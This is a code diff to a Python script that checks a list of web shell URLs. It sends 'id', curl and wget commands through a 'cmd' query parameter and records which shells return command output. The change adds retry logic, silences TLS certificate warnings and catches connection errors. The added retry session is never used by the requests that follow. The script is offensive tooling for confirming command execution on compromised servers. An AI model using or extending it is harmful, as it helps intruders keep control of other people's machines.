@@ -3,6 +3,10 @@ import sys
 
 import requests
 import pandas
+import urllib3
+from requests.adapters import HTTPAdapter, Retry
+# Suppress only the single warning from urllib3.
+urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)
 
 ascii_purple_color = "\x1b[38;5;13m"
 ascii_green_color = "\x1b[32m"
@@ -54,9 +58,17 @@ def send_requests_and_check_responses(shell_url):
         with open(file_with_not_working_shells, 'w') as not_working_shells_file:
             print(ascii_green_color + "Checking shell: " + shell_url + reset_ascii_color)
 
-            response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
-            response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
-            response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text
+            s = requests.Session()
+            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 502, 503, 504])
+            s.mount('http://', HTTPAdapter(max_retries=retries))
+            s.mount('https://', HTTPAdapter(max_retries=retries))
+            try:
+                response_text_id = requests.get(shell_url + f"?cmd={cmd_id}", timeout=7000, verify=False).text
+                response_text_curl = requests.get(shell_url + f"?cmd={cmd_curl}", timeout=7000, verify=False).text
+                response_text_wget = requests.get(shell_url + f"?cmd={cmd_wget}", timeout=7000, verify=False).text
+            except requests.exceptions.ConnectionError as exception:
+                print(exception)
+                pass
 
             contains_uid = response_text_id.find("uid")
             contains_wget_file = secret_message in response_text_wget
